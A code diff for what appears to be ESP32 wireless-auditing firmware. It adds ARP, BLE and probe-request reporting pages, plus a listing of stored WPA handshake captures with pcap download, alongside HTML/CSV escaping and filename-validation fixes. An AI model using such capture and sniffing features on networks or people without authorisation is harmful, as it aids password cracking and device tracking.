+  g_blePrevSelected = g_bleSelectedIdx;
+  display.update();
 }
 
 // ============================================================================
@@ -1252,6 +2787,84 @@ static void goToSleep() {
 //  Uses F() macro to keep HTML strings in flash memory, not SRAM.
 // ============================================================================
 WebServer server(80);
+WebServer arpServer(80);
+
+static void handleArpConfig() {
+  String html;
+  html.reserve(1024);
+  html  = F("<!DOCTYPE html><html><head>");
+  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
+  html += F("<title>ARP Scanner Setup</title><style>");
+  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:24px;max-width:400px;margin:auto}");
+  html += F("h1{color:#f3f4f6;font-size:22px;margin-bottom:4px}");
+  html += F("p{color:#8b949e;font-size:13px;margin-bottom:24px}");
+  html += F("label{display:block;font-size:12px;color:#9da7b3;margin-bottom:6px;font-weight:600;text-transform:uppercase}");
+  html += F("input{width:100%;padding:10px;background:#161b22;border:1px solid #21262d;border-radius:8px;color:#d6d9df;font-size:14px;box-sizing:border-box;margin-bottom:16px}");
+  html += F("button{width:100%;padding:12px;background:#238636;border:none;border-radius:8px;color:white;font-size:14px;font-weight:600;cursor:pointer}");
+  html += F("button:hover{background:#2ea043}");
+  html += F("</style></head><body>");
+  html += F("<h1>ARP Scanner</h1>");
+  html += F("<p>Enter the WiFi network credentials to scan for devices.</p>");
+  html += F("<form method='POST' action='/arpconnect'>");
+  html += F("<label>Network SSID</label>");
+  html += F("<input type='text' name='ssid' placeholder='Network name' required>");
+  html += F("<label>Password</label>");
+  html += F("<input type='password' name='pass' placeholder='Password'>");
+  html += F("<button type='submit'>Connect & Scan</button>");
+  html += F("</form>");
+  html += F("</body></html>");
+  arpServer.send(200, "text/html", html);
+}
+
+static void handleArpConnect() {
+  if (arpServer.hasArg("ssid")) {
+    strncpy(g_arpSSID, arpServer.arg("ssid").c_str(), 32);
+    g_arpSSID[32] = '\0';
+  }
+  if (arpServer.hasArg("pass")) {
+    strncpy(g_arpPass, arpServer.arg("pass").c_str(), 63);
+    g_arpPass[63] = '\0';
+  }
+
+  arpServer.send(200, "text/html",
+    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head>"
+    "<body style='font-family:Inter,sans-serif;background:#0f1117;color:#d6d9df;padding:24px;text-align:center'>"
+    "<h2 style='color:#f3f4f6'>Connecting...</h2>"
+    "<p>The device is connecting to the network. The config AP will close.</p>"
+    "</body></html>");
+
+  delay(500);
+  g_arpConfigMode = false;
+  arpServer.stop();
+  WiFi.softAPdisconnect(true);
+  mode = MODE_ARP;
+}
+
+static void startArpConfig() {
+  g_arpConfigMode = true;
+  g_arpConnected  = false;
+  memset(g_arpSSID, 0, sizeof(g_arpSSID));
+  memset(g_arpPass, 0, sizeof(g_arpPass));
+
+  WiFi.mode(WIFI_AP);
+
+  // Set IP before starting AP
+  IPAddress local_ip(192, 168, 5, 1);
+  IPAddress gateway(192, 168, 5, 1);
+  IPAddress subnet(255, 255, 255, 0);
+  WiFi.softAPConfig(local_ip, gateway, subnet);
+
+  WiFi.softAP(ARP_AP_SSID, ARP_AP_PASS);
+  delay(200);
+
+  arpServer.on("/", handleArpConfig);
+  arpServer.on("/arpconnect", HTTP_POST, handleArpConnect);
+  arpServer.begin();
+
+  mode = MODE_ARP_CONFIG;
+  drawArpConfigScreen();
+}
+
 static void handleWebReport() {
   String html;
   html.reserve(3072);
@@ -1289,6 +2902,8 @@ static void handleWebReport() {
     snprintf(buf, sizeof(buf), "<p class='sub'>%d networks discovered</p>", g_seenCount);
     html += buf;
 
+    html += F("<p class='footer'><a href='/export'>Download last scan CSV</a></p>");
+
     html += F("<div class='tbl-wrap'>");
     html += F("<table><tr><th>ESSID</th><th>BSSID</th><th>PWR</th><th>CH</th>");
     html += F("<th>MB</th><th>ENC</th><th>CIPHER</th><th>AUTH</th><th>RISK</th></tr>");
@@ -1300,7 +2915,8 @@ static void handleWebReport() {
       mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));
 
       html += F("<tr><td>");
-      html += (r.essid[0] ? r.essid : "<i>hidden</i>");
+      if (r.essid[0]) appendHtmlEscaped(html, r.essid);
+      else html += F("<i>hidden</i>");
       html += F("</td><td class='mac'>"); html += bf;
       snprintf(buf, sizeof(buf), "</td><td>%d</td><td>%d</td><td>%s</td><td>",
                r.rssi, r.channel, mb);
@@ -1348,7 +2964,8 @@ static void handleWebReport() {
         }
 
         html += F("<tr><td>");
-        html += (r.essid[0] ? r.essid : "<i>hidden</i>");
+        if (r.essid[0]) appendHtmlEscaped(html, r.essid);
+        else html += F("<i>hidden</i>");
         html += F("</td><td class='mac'>");
         html += bf;
         html += F("</td><td class='danger'>");
@@ -1359,12 +2976,10 @@ static void handleWebReport() {
       html += F("</div>");
     }
   }
-
-  // Probe requests section
+  // ── Probe Requests ────────────────────────────────────────────────────────
   if (g_probeCount > 0) {
     html += F("<h2>Probe Requests</h2>");
 
-    // Count unique devices
     static bool counted[MAX_PROBES];
     memset(counted, 0, sizeof(counted));
     int uniqueDevices = 0;
@@ -1377,7 +2992,6 @@ static void handleWebReport() {
       }
     }
 
-    // Summary stats
     char probeSummary[128];
     snprintf(probeSummary, sizeof(probeSummary),
       "<p class='sub'>%d unique devices &nbsp;|&nbsp; %d named probes &nbsp;|&nbsp; %lu total seen</p>",
@@ -1395,9 +3009,7 @@ static void handleWebReport() {
     html += F("<div class='tbl-wrap'>");
     html += F("<table>");
     html += F("<tr><th>#</th><th>MAC</th><th>Type</th><th>Networks</th><th>SSIDs</th></tr>");
-    
 
-    // Build sorted index — devices with most SSIDs first
     memset(counted, 0, sizeof(counted));
     static int sortedIdx[MAX_PROBES];
     int sortedCount = 0;
@@ -1443,11 +3055,10 @@ static void handleWebReport() {
       }
 
       bool isCorporate = ssidCount >= 3;
-
       char bf[18];
       bssidFull(g_probes[i].mac, bf, sizeof(bf));
 
-      html += F("<tr><td>Client ");
+      html += F("<tr><td>C ");
       html += clientNum++;
       html += F("</td><td class='mac'>");
       html += bf;
@@ -1457,28 +3068,209 @@ static void handleWebReport() {
       html += ssidCount;
       if (isCorporate) html += F(" <span class='danger'>corp?</span>");
       html += F("</td><td>");
-
-      // First SSID
       html += F("&rarr; ");
-      html += g_probes[i].ssid;
-
-      // Remaining SSIDs for this MAC
+      appendHtmlEscaped(html, g_probes[i].ssid);
       for (int j = i + 1; j < g_probeCount; j++) {
         if (memcmp(g_probes[i].mac, g_probes[j].mac, 6) == 0) {
           html += F("<br>&rarr; ");
-          html += g_probes[j].ssid;
+          appendHtmlEscaped(html, g_probes[j].ssid);
         }
       }
-
       html += F("</td></tr>");
     }
 
     html += F("</table></div>");
-    html += F("<p><a href='/probes'>View Saved Probe Sessions &rarr;</a></p>");
   }
 
+  // ── ARP Scan Results ─────────────────────────────────────────────────────
+  if (g_arpCount > 0) {
+    html += F("<h2>ARP Scan Results</h2>");
+
+    char arpSummary[128];
+    snprintf(arpSummary, sizeof(arpSummary),
+      "<p class='sub'>%d devices discovered on %s</p>",
+      g_arpCount, g_arpSSID);
+    html += arpSummary;
+
+    html += F("<div class='tbl-wrap'>");
+    html += F("<table>");
+    html += F("<tr><th>#</th><th>IP Address</th><th>MAC</th><th>Vendor</th><th>Seen</th></tr>");
+
+    for (int i = 0; i < g_arpCount; i++) {
+      const ArpEntry& e = g_arpEntries[i];
+      char bf[18];
+      bssidFull(e.mac, bf, sizeof(bf));
+
+      // Identify common vendors from MAC OUI
+      const char* vendor = "Unknown";
+      if      (e.mac[0]==0xCC && e.mac[1]==0x28 && e.mac[2]==0xAA) vendor = "ASUS";
+      else if (e.mac[0]==0x44 && e.mac[1]==0x1B && e.mac[2]==0xF6) vendor = "Heltec";
+      else if (e.mac[0]==0xAC || e.mac[0]==0xBC || e.mac[0]==0x8C) vendor = "Samsung";
+      else if (e.mac[0]==0x3C || e.mac[0]==0xF4 || e.mac[0]==0xA4) vendor = "Apple";
+      else if (e.mac[0]==0x00 && e.mac[1]==0x0C && e.mac[2]==0x29) vendor = "VMware";
+
+      html += F("<tr><td>");
+      html += (i + 1);
+      html += F("</td><td class='mac'>");
+      html += e.ip[0]; html += F(".");
+      html += e.ip[1]; html += F(".");
+      html += e.ip[2]; html += F(".");
+      html += e.ip[3];
+      html += F("</td><td class='mac'>");
+      html += bf;
+      html += F("</td><td>");
+      html += vendor;
+      html += F("</td><td class='muted'>");
+      html += e.count;
+      html += F(" packets</td></tr>");
+    }
+
+    html += F("</table></div>");
+  }
+
+  // ── BLE Scan Results ─────────────────────────────────────────────────────
+  if (g_bleCount > 0) {
+    html += F("<h2>BLE Devices</h2>");
+
+    // Count by type
+    int iotCount     = 0;
+    int appleCount   = 0;
+    int samsungCount = 0;
+    int fitnessCount = 0;
+    int conCount     = 0;
+    for (int i = 0; i < g_bleCount; i++) {
+      if (g_bleDevices[i].isIoT)       iotCount++;
+      if (g_bleDevices[i].isApple)     appleCount++;
+      if (g_bleDevices[i].isSamsung)   samsungCount++;
+      if (g_bleDevices[i].isFitness)   fitnessCount++;
+      if (g_bleDevices[i].connectable) conCount++;
+    }
+
+    char bleSummary[192];
+    snprintf(bleSummary, sizeof(bleSummary),
+      "<p class='sub'>%d devices &nbsp;|&nbsp; %d Apple &nbsp;|&nbsp; "
+      "%d Samsung &nbsp;|&nbsp; %d Fitness &nbsp;|&nbsp; "
+      "%d IoT &nbsp;|&nbsp; %d Connectable</p>",
+      g_bleCount, appleCount, samsungCount,
+      fitnessCount, iotCount, conCount);
+    html += bleSummary;
+
+    html += F("<div class='tbl-wrap'>");
+    html += F("<table>");
+    html += F("<tr><th>#</th><th>MAC</th><th>Name</th><th>Vendor</th>"
+              "<th>Type</th><th>RSSI</th><th>Conn</th><th>Seen</th></tr>");
+
+    for (int i = 0; i < g_bleCount; i++) {
+      const BleDevice& d = g_bleDevices[i];
+      char bf[18];
+      bssidFull(d.mac, bf, sizeof(bf));
+
+      const char* type = "Generic";
+      const char* typeColor = "#6e7681";
+      if (d.isIoT) {
+        type = "IoT";
+        typeColor = "#e67e22";
+      } else if (d.isApple) {
+        type = "Apple";
+        typeColor = "#58a6ff";
+      } else if (d.isSamsung) {
+        type = "Samsung";
+        typeColor = "#1f6feb";
+      } else if (d.isFitness) {
+        type = "Fitness";
+        typeColor = "#2ecc71";
+      }
+
+      html += F("<tr><td>");
+      html += (i + 1);
+      html += F("</td><td class='mac'>");
+      html += bf;
+      html += F("</td><td>");
+      if (d.name[0]) appendHtmlEscaped(html, d.name);
+      else html += F("<span class='muted'>(unnamed)</span>");
+      html += F("</td><td>");
+      html += bleVendorName(d.manufacturer);
+      html += F("</td><td><span class='badge' style='background:");
+      html += typeColor;
+      html += F("'>");
+      html += type;
+      html += F("</span></td><td>");
+      html += d.rssi;
+      html += F(" dBm</td><td>");
+      html += d.connectable ?
+        F("<span class='danger'>YES</span>") :
+        F("<span class='muted'>no</span>");
+      html += F("</td><td class='muted'>");
+      html += d.count;
+      html += F("x</td></tr>");
+    }
+
+    html += F("</table></div>");
+
+    // Highlight connectable IoT devices
+    bool anyConnectable = false;
+    for (int i = 0; i < g_bleCount; i++) {
+      if (g_bleDevices[i].connectable && g_bleDevices[i].isIoT) {
+        anyConnectable = true;
+        break;
+      }
+    }
+    if (anyConnectable) {
+      html += F("<p class='danger'>!! Connectable BLE devices detected. "
+                "These devices advertise BLE connectivity and may accept connections without authentication.</p>");
+    }
+  }
+
+  // ── Handshake Captures ────────────────────────────────────────────────────
   html += F("<div class='card'>");
-  html += F("<h2>Scan Sessions</h2>");
+  html += F("<h2>Handshake Captures</h2>");
+
+  char hsBuf[128];
+  snprintf(hsBuf, sizeof(hsBuf),
+    "<p class='muted'>%d captures stored</p>",
+    g_handshakeIndex.count);
+  html += hsBuf;
+
+  if (g_handshakeIndex.count > 0) {
+    html += F("<div class='tbl-wrap'>");
+    html += F("<table>");
+    html += F("<tr><th>SSID</th><th>CH</th><th>EAPOL</th><th>Status</th><th>File</th></tr>");
+
+    for (int n = 0; n < g_handshakeIndex.count; n++) {
+      int i = (g_handshakeIndex.next - 1 - n + MAX_HANDSHAKES) % MAX_HANDSHAKES;
+      HandshakeMeta& s = g_handshakeIndex.sessions[i];
+      if (!s.filename[0]) continue;
+
+      html += F("<tr><td>");
+      if (s.ssid[0]) appendHtmlEscaped(html, s.ssid);
+      else html += F("<i>hidden</i>");
+      html += F("</td><td>");
+      html += String(s.channel);
+      html += F("</td><td>");
+      html += String(s.eapolCount);
+      html += F("</td><td>");
+      if (s.eapolCount >= 4) {
+        html += F("<span class='badge' style='background:#238636'>VALID</span>");
+      } else if (s.eapolCount > 0) {
+        html += F("<span class='badge' style='background:#9e6a03'>PARTIAL</span>");
+      } else {
+        html += F("<span class='badge' style='background:#6e7681'>EMPTY</span>");
+      }
+      html += F("</td><td><a href='/downloadHandshake?id=");
+      html += String(i);
+      html += F("'>Download</a></td></tr>");
+    }
+
+    html += F("</table></div>");
+  } else {
+    html += F("<p class='muted'>No handshake captures saved yet.</p>");
+  }
+
+  html += F("</div>");
+
+   // ── WiFi Scan Sessions ────────────────────────────────────────────────────
+  html += F("<div class='card'>");
+  html += F("<h2>WiFi Scan Sessions</h2>");
 
   char sessionBuf[128];
   size_t total = fsTotalBytesSafe();
@@ -1491,24 +3283,69 @@ static void handleWebReport() {
   html += sessionBuf;
 
   if (g_sessionIndex.count > 0) {
-    html += F("<p><a href='/sessions'>View All Sessions &rarr;</a></p>");
+    html += F("<p><a href='/sessions'>View Saved WiFi Sessions &rarr;</a></p>");
   } else {
-    html += F("<p class='muted'>No sessions saved yet. Run a scan first.</p>");
+    html += F("<p class='muted'>No WiFi sessions saved yet. Run a scan first.</p>");
   }
   html += F("</div>");
 
-  html += F("<p class='footer'><a href='/export'>Download last scan CSV</a></p>");
+  // ── Probe Sessions ────────────────────────────────────────────────────────
+  html += F("<div class='card'>");
+  html += F("<h2>Probe Sessions</h2>");
+
+  char probeSessBuf[128];
+  snprintf(probeSessBuf, sizeof(probeSessBuf),
+    "<p class='muted'>%d sessions stored &nbsp;|&nbsp; %d%% flash used</p>",
+    g_probeTotal, pct);
+  html += probeSessBuf;
+
+  if (g_probeTotal > 0) {
+    html += F("<p><a href='/probes'>View Saved Probe Sessions &rarr;</a></p>");
+  } else {
+    html += F("<p class='muted'>No probe sessions saved yet. Run the probe sniffer first.</p>");
+  }
+
+  html += F("</div>");
+
+  // ── ARP Sessions ─────────────────────────────────────────────────────────
+  html += F("<div class='card'>");
+  html += F("<h2>ARP Sessions</h2>");
+  char arpSesBuf[128];
+  snprintf(arpSesBuf, sizeof(arpSesBuf),
+    "<p class='muted'>%d sessions stored</p>", g_arpSessionTotal);
+  html += arpSesBuf;
+  if (g_arpSessionTotal > 0) {
+    html += F("<p><a href='/arpsessions'>View Saved ARP Sessions &rarr;</a></p>");
+  } else {
+    html += F("<p class='muted'>No ARP sessions saved yet.</p>");
+  }
+  html += F("</div>");
+
+  // ── BLE Sessions ─────────────────────────────────────────────────────────
+  html += F("<div class='card'>");
+  html += F("<h2>BLE Sessions</h2>");
+  char bleSesBuf[128];
+  snprintf(bleSesBuf, sizeof(bleSesBuf),
+    "<p class='muted'>%d sessions stored</p>", g_bleScanTotal);
+  html += bleSesBuf;
+  if (g_bleScanTotal > 0) {
+    html += F("<p><a href='/blesessions'>View Saved BLE Sessions &rarr;</a></p>");
+  } else {
+    html += F("<p class='muted'>No BLE sessions saved yet.</p>");
+  }
+  html += F("</div>");
 
   html += F("</body></html>");
   server.send(200, "text/html", html);
 }
+
 
 static void handleSessions() {
   String html;
   html.reserve(2048);
   html  = F("<!DOCTYPE html><html><head>");
   html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
-  html += F("<title>Scan Sessions</title><style>");
+  html += F("<title>Wifi Scan Sessions</title><style>");
   html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
   html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
   html += F("h2{font-size:18px;margin-top:24px;margin-bottom:10px;color:#f3f4f6}");
@@ -1527,7 +3364,7 @@ static void handleSessions() {
   html += F(".danger{color:#ff7b72;font-weight:600}");
   html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
   html += F("</style></head><body>");
-  html += F("<h1>Scan Sessions</h1>");
+  html += F("<h1>Wifi Scan Sessions</h1>");
   html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");
 
   if (g_sessionIndex.count == 0) {
@@ -1580,7 +3417,7 @@ static void handleSessionDownload() {
   String filename = server.arg("f");
 
   // Safety check - only allow s000.csv style filenames
-  if (filename.length() > 10 || !filename.startsWith("s") || !filename.endsWith(".csv")) {
+  if (!isIndexedFilename(filename, 's', "csv")) {
     server.send(400, "text/plain", "Invalid filename");
     return;
   }
@@ -1605,13 +3442,13 @@ static void handleCsvExport() {
   csv = F("=== WiFi Scan ===\r\n");
   csv += F("ESSID,BSSID,PWR,CH,MB,ENC,CIPHER,AUTH,RISK,FIRST_SEEN_S,LAST_SEEN_S,SIGHTINGS,FLAGS\r\n");
 
-  for (int i = 0; i < g_seenCount; i++) {
-    const ScanResult& r = g_seen[i];
+  for (int i = 0; i < g_resultCount; i++) {
+    const ScanResult& r = g_results[i];
     char bf[18], mb[8];
     bssidFull(r.bssid, bf, sizeof(bf));
     mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));
 
-    csv += (r.essid[0] ? r.essid : "(hidden)");
+    appendCsvEscaped(csv, r.essid[0] ? r.essid : "(hidden)");
     csv += ","; csv += bf;
     csv += ","; csv += r.rssi;
     csv += ","; csv += r.channel;
@@ -1637,7 +3474,7 @@ static void handleCsvExport() {
       char bf[18];
       bssidFull(p.mac, bf, sizeof(bf));
       csv += bf;
-      csv += ","; csv += (p.ssid[0] ? p.ssid : "<any>");
+      csv += ","; appendCsvEscaped(csv, p.ssid[0] ? p.ssid : "<any>");
       csv += ","; csv += p.rssi;
       csv += ","; csv += (p.firstSeen / 1000);
       csv += ","; csv += (p.lastSeen / 1000);
@@ -1725,6 +3562,78 @@ static void handleProbes() {
   server.send(200, "text/html", html);
 }
 
+static void handleArpSessions() {
+  String html;
+  html.reserve(2048);
+  html  = F("<!DOCTYPE html><html><head>");
+  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
+  html += F("<title>ARP Sessions</title><style>");
+  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
+  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
+  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
+  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
+  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
+  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
+  html += F("tr:last-child td{border-bottom:none}");
+  html += F("tr:nth-child(even){background:#141922}");
+  html += F("tr:hover{background:#1b222c}");
+  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
+  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
+  html += F("a:hover{text-decoration:underline}");
+  html += F(".muted{color:#8b949e;font-size:11px}");
+  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
+  html += F("</style></head><body>");
+  html += F("<h1>ARP Sessions</h1>");
+  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");
+
+  File dir = FS.open("/arp");
+  if (!dir || !dir.isDirectory()) {
+    html += F("<p class='muted'>No ARP sessions saved yet.</p>");
+  } else {
+    int fileCount = 0;
+    File f = dir.openNextFile();
+    while (f) { if (!f.isDirectory()) fileCount++; f = dir.openNextFile(); }
+    dir.close();
+
+    if (fileCount == 0) {
+      html += F("<p class='muted'>No ARP sessions saved yet.</p>");
+    } else {
+      char buf[64];
+      snprintf(buf, sizeof(buf), "<p class='muted'>%d ARP sessions stored</p>", fileCount);
+      html += buf;
+
+      html += F("<div class='tbl-wrap'>");
+      html += F("<table><tr><th>Session</th><th>Size</th><th>Download</th></tr>");
+
+      dir = FS.open("/arp");
+      f = dir.openNextFile();
+      int num = 1;
+      while (f) {
+        if (!f.isDirectory()) {
+          String fname = String(f.name());
+          int slash = fname.lastIndexOf('/');
+          if (slash >= 0) fname = fname.substring(slash + 1);
+
+          html += F("<tr><td>ARP #");
+          html += num++;
+          html += F("</td><td class='muted'>");
+          html += f.size();
+          html += F(" bytes</td><td><a href='/arp?f=");
+          html += fname;
+          html += F("'>Download CSV</a></td></tr>");
+        }
+        f = dir.openNextFile();
+      }
+      dir.close();
+      html += F("</table></div>");
+    }
+  }
+
+  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
+  html += F("</body></html>");
+  server.send(200, "text/html", html);
+}
+
 static void handleProbeDownload() {
   if (!server.hasArg("f")) {
     server.send(400, "text/plain", "Missing file parameter");
@@ -1733,7 +3642,7 @@ static void handleProbeDownload() {
   String filename = server.arg("f");
 
   // Safety check
-  if (filename.length() > 10 || !filename.startsWith("p") || !filename.endsWith(".csv")) {
+  if (!isIndexedFilename(filename, 'p', "csv")) {
     server.send(400, "text/plain", "Invalid filename");
     return;
   }
@@ -1750,8 +3659,169 @@ static void handleProbeDownload() {
   f.close();
 }
 
+static void handleHandshakeDownload() {
+
+    if (!server.hasArg("id")) {
+        server.send(400, "text/plain", "Missing ID");
+        return;
+    }
+
+    int id = server.arg("id").toInt();
+
+    if (id < 0 || id >= g_handshakeIndex.count) {
+        server.send(404, "text/plain", "Invalid ID");
+        return;
+    }
+
+    HandshakeMeta& s =
+        g_handshakeIndex.sessions[id];
+
+    char path[64];
+
+    snprintf(path,
+             sizeof(path),
+             "/handshakes/%s",
+             s.filename);
+
+    File f = FS.open(path, "r");
+
+    if (!f) {
+        server.send(404, "text/plain", "File not found");
+        return;
+    }
+
+    server.streamFile(
+        f,
+        "application/vnd.tcpdump.pcap"
+    );
+
+    f.close();
+}
+
+static void handleArpDownload() {
+  if (!server.hasArg("f")) {
+    server.send(400, "text/plain", "Missing file parameter");
+    return;
+  }
+  String filename = server.arg("f");
+
+  if (!isIndexedFilename(filename, 'a', "csv")) {
+    server.send(400, "text/plain", "Invalid filename");
+    return;
+  }
+
+  String path = "/arp/" + filename;
+  File f = FS.open(path, "r");
+  if (!f) {
+    server.send(404, "text/plain", "ARP session not found");
+    return;
+  }
+
+  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
+  server.streamFile(f, "text/csv");
+  f.close();
+}
+
+static void handleBleSessions() {
+  String html;
+  html.reserve(2048);
+  html  = F("<!DOCTYPE html><html><head>");
+  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
+  html += F("<title>BLE Sessions</title><style>");
+  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
+  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
+  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
+  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
+  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
+  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
+  html += F("tr:last-child td{border-bottom:none}");
+  html += F("tr:nth-child(even){background:#141922}");
+  html += F("tr:hover{background:#1b222c}");
+  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
+  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
+  html += F("a:hover{text-decoration:underline}");
+  html += F(".muted{color:#8b949e;font-size:11px}");
+  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
+  html += F("</style></head><body>");
+  html += F("<h1>BLE Sessions</h1>");
+  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");
+
+  File dir = FS.open("/ble");
+  if (!dir || !dir.isDirectory()) {
+    html += F("<p class='muted'>No BLE sessions saved yet.</p>");
+  } else {
+    int fileCount = 0;
+    File f = dir.openNextFile();
+    while (f) { if (!f.isDirectory()) fileCount++; f = dir.openNextFile(); }
+    dir.close();
+
+    if (fileCount == 0) {
+      html += F("<p class='muted'>No BLE sessions saved yet.</p>");
+    } else {
+      char buf[64];
+      snprintf(buf, sizeof(buf), "<p class='muted'>%d BLE sessions stored</p>", fileCount);
+      html += buf;
+
+      html += F("<div class='tbl-wrap'>");
+      html += F("<table><tr><th>Session</th><th>Size</th><th>Download</th></tr>");
+
+      dir = FS.open("/ble");
+      f = dir.openNextFile();
+      int num = 1;
+      while (f) {
+        if (!f.isDirectory()) {
+          String fname = String(f.name());
+          int slash = fname.lastIndexOf('/');
+          if (slash >= 0) fname = fname.substring(slash + 1);
+
+          html += F("<tr><td>BLE #");
+          html += num++;
+          html += F("</td><td class='muted'>");
+          html += f.size();
+          html += F(" bytes</td><td><a href='/blesession?f=");
+          html += fname;
+          html += F("'>Download CSV</a></td></tr>");
+        }
+        f = dir.openNextFile();
+      }
+      dir.close();
+      html += F("</table></div>");
+    }
+  }
+
+  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
+  html += F("</body></html>");
+  server.send(200, "text/html", html);
+}
+
+static void handleBleDownload() {
+  if (!server.hasArg("f")) {
+    server.send(400, "text/plain", "Missing file parameter");
+    return;
+  }
+  String filename = server.arg("f");
+
+  if (!isIndexedFilename(filename, 'b', "csv")) {
+    server.send(400, "text/plain", "Invalid filename");
+    return;
+  }
+
+  String path = "/ble/" + filename;
+  File f = FS.open(path, "r");
+  if (!f) {
+    server.send(404, "text/plain", "BLE session not found");
+    return;
+  }
+
+  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
+  server.streamFile(f, "text/csv");
+  f.close();
+}
+
 static void startWebReport() {
   setCpuFrequencyMhz(240);
+  server.stop();
+  delay(100);  
   WiFi.mode(WIFI_AP);
   WiFi.softAP(AP_SSID, AP_PASS);
   delay(200);
@@ -1760,7 +3830,14 @@ static void startWebReport() {
   server.on("/sessions", handleSessions);
   server.on("/session", handleSessionDownload);
   server.on("/probes", handleProbes);
+  server.on("/blesessions", handleBleSessions);
+  server.on("/blesession",  handleBleDownload);
   server.on("/probe", handleProbeDownload); 
+  server.on("/downloadHandshake",
+          HTTP_GET,
+          handleHandshakeDownload);
+  server.on("/arpsessions", handleArpSessions);
+  server.on("/arp", handleArpDownload);
   server.begin();
   mode = MODE_WEBREPORT;
   drawWebReportScreen();
@@ -1778,14 +3855,80 @@ static void stopWebReport() {
   setCpuFrequencyMhz(80);
   mode = MODE_MENU;
   menuSelected = 0;
+  menuScrollOffset = 0;
   drawMenu();
 }
 
 // ============================================================================
 //  Storage helpers
 // ============================================================================
+// Mount without auto-formatting. A mount failure must never silently erase
+// stored sessions or captures.
 static bool fsBegin() {
-  return FS.begin(true);
+  bool ok = FS.begin(false);
+  if (ok) {
+    loadHandshakeIndex();
+  }
+  return ok;
+}
+
+static bool isIndexedFilename(const String& filename, char prefix, const char* extension) {
+  // Expected format: <prefix><3 decimal digits>.<extension>, e.g. p000.csv.
+  const size_t extLen = strlen(extension);
+  const size_t expectedLen = 1 + 3 + 1 + extLen;
+  if (filename.length() != expectedLen) return false;
+  if (filename.charAt(0) != prefix) return false;
+  if (filename.charAt(4) != '.') return false;
+  for (int i = 1; i <= 3; ++i) {
+    char c = filename.charAt(i);
+    if (c < '0' || c > '9') return false;
+  }
+  for (size_t i = 0; i < extLen; ++i) {
+    if (filename.charAt(5 + i) != extension[i]) return false;
+  }
+  return true;
+}
+
+static void appendHtmlEscaped(String& out, const char* value) {
+  if (!value) return;
+  for (const unsigned char* p = (const unsigned char*)value; *p; ++p) {
+    switch (*p) {
+      case '&': out += F("&amp;");  break;
+      case '<': out += F("&lt;");   break;
+      case '>': out += F("&gt;");   break;
+      case '\"': out += F("&quot;"); break;
+      case '\'': out += F("&#39;");  break;
+      default:   out += (char)*p;    break;
+    }
+  }
+}
+
+static void appendCsvEscaped(String& out, const char* value) {
+  if (!value) { out += F("\"\""); return; }
+  bool quote = false;
+  for (const char* p = value; *p; ++p) {
+    if (*p == ',' || *p == '\"' || *p == '\r' || *p == '\n') { quote = true; break; }
+  }
+  if (quote) out += '\"';
+  for (const char* p = value; *p; ++p) {
+    if (*p == '\"') out += F("\"\"");
+    else out += *p;
+  }
+  if (quote) out += '\"';
+}
+
+static void fileCsvEscaped(File& f, const char* value) {
+  if (!value) { f.print("\"\""); return; }
+  bool quote = false;
+  for (const char* p = value; *p; ++p) {
+    if (*p == ',' || *p == '\"' || *p == '\r' || *p == '\n') { quote = true; break; }
+  }
+  if (quote) f.print('\"');
+  for (const char* p = value; *p; ++p) {
+    if (*p == '\"') f.print("\"");
+    f.print(*p);
+  }
+  if (quote) f.print('\"');
 }
 
 static size_t fsTotalBytesSafe() { return FS.totalBytes(); }
@@ -1803,7 +3946,14 @@ static void loadSessionIndex() {
     g_sessionIndexLoaded = true;
     return;
   }
-  f.read((uint8_t*)&g_sessionIndex, sizeof(g_sessionIndex));
+  if (f.size() != sizeof(g_sessionIndex)) {
+    f.close();
